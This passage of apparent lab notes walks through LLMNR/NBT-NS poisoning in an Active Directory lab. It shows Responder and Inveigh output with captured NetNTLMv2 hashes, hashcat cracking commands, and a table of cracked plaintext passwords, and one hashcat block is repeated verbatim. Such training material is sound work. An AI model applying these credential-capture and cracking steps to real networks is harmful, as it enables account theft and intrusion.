+* clusteragent
+* wley
+* svc_qualys
+* backupagent
+
+We need to save these exact lines into a text file on out attack machine. (It can be directly copy-pasted for simplicity)
+
+**Cracking the hashes**
+
+Once in our attack machine, we can run hashcat using the mode 5600 (NetNTLMv2) to crack them against a wordlist like rockyou.txt.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+hashcat -m 5600 all_captured_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# hashcat (v6.2.6) starting
+
+# ...
+# WLEY::INLANEFREIGHT:8c97909457e2ac3b:a25db549b24d0b7fc6f7ad364a0cb959:010100000000000000fe27303fafdc0151d3c60cc638045f0000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
+# SVC_QUALYS::INLANEFREIGHT:fd43c5eccc6cf9f1:7917a3e2b1173b51aa7332cbd10d2eaa:010100000000000000fe27303fafdc01cb1fee7bf36eecab0000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:security#1
+# BACKUPAGENT::INLANEFREIGHT:6643cab7512aabd0:d8ff6fefa4c5edf6c537882733717c4f:010100000000000000fe27303fafdc01b64a1e96e4f296480000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
+# FOREND::INLANEFREIGHT:4fe35cd3e684dcbe:bc440e6e0781b073c6b23e90ddf916d5:010100000000000000fe27303fafdc0112f6304b76b090f40000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
+```
+
+</td>
+</tr>
+</table>
+
+**Compromised Credentials (LLMNR/NBT-NS Poisoning)**
+
+| Username | Plaintext Password | Hash Type | Extraction Method |
+| :--- | :--- | :--- | :--- |
+| `INLANEFREIGHT\wley` | `transporter@4` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\forend` | `Klmcargo2` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\backupagent` | `h1backup55` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\svc_qualys` | `security#1` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+
+</details>
+
+<details>
+<summary><h5>Option b - C# Inveigh (InveighZero)</h5></summary>
+
+The PowerShell version is no longer updated. C# Version (.exe) is the active version maintained by the author. Combines original PoC and PowerShell code.
+
+**Run Inveigh.exe**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+.\Inveigh.exe
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+...
+[-] [20:19:52] LLMNR(AAAA) request [academy-ea-web0] from fe80::599c:a5ca:dae4:f1e4%8 [type ignored]
+[-] [20:19:52] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
+[.] [20:19:53] TCP(1433) SYN packet from 172.16.5.130:53320
+[.] [20:19:53] TCP(1433) SYN packet from 172.16.5.130:53321
+[.] [20:19:53] TCP(1433) SYN packet from 172.16.5.130:53319
+[.] [20:19:53] TCP(445) SYN packet from 172.16.5.130:53322
+[.] [20:19:53] SMB1(445) negotiation request detected from 172.16.5.130:53322
+[.] [20:19:53] SMB2+(445) negotiation request detected from 172.16.5.130:53322
+[+] [20:19:53] SMB(445) NTLM challenge [9FDAE23F865A31DE] sent to 172.16.5.25:53322
+[+] [20:19:53] SMB(445) NTLMv2 captured for [INLANEFREIGHT\forend] from 172.16.5.130(ACADEMY-EA-FILE):53322:
+forend::INLANEFREIGHT:9FDAE23F865A31DE:F2B5F5188341BB4F3F068711CC1F0CEC:01010000000000000FBB35C33CB0DC01BC54C2589E9CE8FF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000FBB35C33CB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+[!] [20:19:53] SMB(445) NTLMv2 for [INLANEFREIGHT\forend] written to Inveigh-NTLMv2.txt
+[.] [20:19:53] TCP(1433) SYN packet from 172.16.5.130:53323
+[.] [20:19:53] TCP(445) SYN packet from 172.16.5.130:53324
+[.] [20:19:53] SMB2+(445) negotiation request detected from 172.16.5.130:53324
+[.] [20:19:53] TCP(445) SYN packet from 172.16.5.130:53325
+[.] [20:19:53] SMB2+(445) negotiation request detected from 172.16.5.130:53325
+[.] [20:19:53] TCP(445) SYN packet from 172.16.5.130:53326
+[+] [20:19:53] SMB(445) NTLM challenge [1AF91361753A5A68] sent to 172.16.5.25:53324
+[+] [20:19:53] SMB(445) NTLMv2 captured for [INLANEFREIGHT\forend] from 172.16.5.130(ACADEMY-EA-FILE):53324 [not unique]
+[.] [20:19:53] SMB2+(445) negotiation request detected from 172.16.5.130:53326
+[+] [20:19:53] SMB(445) NTLM challenge [44DEDBB07C0C11B0] sent to 172.16.5.25:53325
+[+] [20:19:53] SMB(445) NTLM challenge [441AD4DCEA84FB47] sent to 172.16.5.25:53326
+[+] [20:19:53] SMB(445) NTLMv2 captured for [INLANEFREIGHT\forend] from 172.16.5.130(ACADEMY-EA-FILE):53326 [not unique]
+...
+```
+
+</td>
+</tr>
+</table>
+
+As we can see, the tool starts and shows which options are enabled by default and which are not. 
+
+Status Indicators:
+
+* `[+]` = Feature is currently enabled.
+* `[ ]` = Feature is currently disabled.
+
+Interactive Console:
+
+* Press ESC during execution to enter or exit the console.
+* Use Cases: Access captured credentials/hashes, safely stop the tool, and manage the active session.
+
+**Hit the esc key to enter the console while Inveigh is running**
+
+This is the most important command. It filters the massive output and provides only one hash per user (NTLMv2 format).
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C(0:0) NTLMv1(0:0) NTLMv2(5:31)>`**
+
+</td>
+<td>
+
+```powershell
+GET NTLMV2UNIQUE
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+================================================= Unique NTLMv2 Hashes =================================================
+
+Hashes
+========================================================================================================================
+svc_qualys::INLANEFREIGHT:A0451CEA9E63D5C7:A75973FA3F7B0DE4F4E5EEFE57744603:01010000000000001BB03EA93CB0DC01E7FEECDF30BC01380000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001BB03EA93CB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+forend::INLANEFREIGHT:9FDAE23F865A31DE:F2B5F5188341BB4F3F068711CC1F0CEC:01010000000000000FBB35C33CB0DC01BC54C2589E9CE8FF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000FBB35C33CB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+clusteragent::INLANEFREIGHT:9442944E28D347EB:8DFABDF8F41B17F6C32D63655C638698:01010000000000000B1479CD3CB0DC01C883A0BFD4FD32240000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000B1479CD3CB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+lab_adm::INLANEFREIGHT:A581E000513E8EE6:56F8DFAE08A6271FEEAC688BEE3685D0:010100000000000015C5CADF3CB0DC0136BC9532990707920000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080015C5CADF3CB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
+backupagent::INLANEFREIGHT:04E5A1D8C4525923:4D60D3CEBCCC413D02C91BE5250E5F98:0101000000000000F5D820ED3CB0DC01B56F34D4CD74F04C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800F5D820ED3CB0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+wley::INLANEFREIGHT:A14895B3E30A8306:5EE0780FF8495A7AEB367ED8428D4C95:010100000000000042AB4BFD39B0DC011EFB6EAFA54BB0EC0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080042AB4BFD39B0DC01060004000200000008003000300000000000000000000000003000007411E24F897D1317CC501EE2C7CA853CFB4D9FE457119935F5146CAB215669A60A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+```
+
+</td>
+</tr>
+</table>
+
+This is the exact string you will copy and paste into a file to feed to Hashcat or John the Ripper.
+
+**Cracking the hashes**
+
+Once in our attack machine, we can run hashcat using the mode 5600 (NetNTLMv2) to crack them against a wordlist like rockyou.txt.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+hashcat -m 5600 all_captured_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# hashcat (v6.2.6) starting
+
+# ...
+# WLEY::INLANEFREIGHT:8c97909457e2ac3b:a25db549b24d0b7fc6f7ad364a0cb959:010100000000000000fe27303fafdc0151d3c60cc638045f0000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
+# SVC_QUALYS::INLANEFREIGHT:fd43c5eccc6cf9f1:7917a3e2b1173b51aa7332cbd10d2eaa:010100000000000000fe27303fafdc01cb1fee7bf36eecab0000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:security#1
+# BACKUPAGENT::INLANEFREIGHT:6643cab7512aabd0:d8ff6fefa4c5edf6c537882733717c4f:010100000000000000fe27303fafdc01b64a1e96e4f296480000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
+# FOREND::INLANEFREIGHT:4fe35cd3e684dcbe:bc440e6e0781b073c6b23e90ddf916d5:010100000000000000fe27303fafdc0112f6304b76b090f40000000002000800370049005a00500001001e00570049004e002d005a00340048005500310037004a004c004d004200550004003400570049004e002d005a00340048005500310037004a004c004d00420055002e00370049005a0050002e004c004f00430041004c0003001400370049005a0050002e004c004f00430041004c0005001400370049005a0050002e004c004f00430041004c000700080000fe27303fafdc01060004000200000008003000300000000000000000000000003000007e8439a33791b151652c96dbc4b8b1f50a9ae52f6dd07b77457eb4d935a0bdf60a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
+```
+
+</td>
+</tr>
+</table>
+
+**Compromised Credentials (LLMNR/NBT-NS Poisoning)**
+
+| Username | Plaintext Password | Hash Type | Extraction Method |
+| :--- | :--- | :--- | :--- |
+| `INLANEFREIGHT\wley` | `transporter@4` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\forend` | `Klmcargo2` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\backupagent` | `h1backup55` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+| `INLANEFREIGHT\svc_qualys` | `security#1` | NetNTLMv2 | Responder + Hashcat (`rockyou.txt`) |
+
+
+</details>
+
+</details>
+
+</details>
 
 </details>
 
